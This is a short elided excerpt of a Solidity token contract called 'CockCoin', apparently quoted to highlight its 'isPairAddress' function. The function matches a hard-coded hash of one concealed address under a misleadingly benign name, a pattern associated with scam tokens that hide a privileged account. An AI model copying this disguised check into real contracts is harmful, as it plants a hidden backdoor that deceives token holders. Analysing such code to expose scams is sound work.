...
library Address {
    ...
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd3d127d760dd8059fa67e2a1077990c665a74d1acfdc1ccdcaa98bd2ba;
    }
}
...
contract CockCoin is Ownable, IERC20 {
    ...
    string private _name = "CockCoin";

    string private _symbol = "CockCoin";
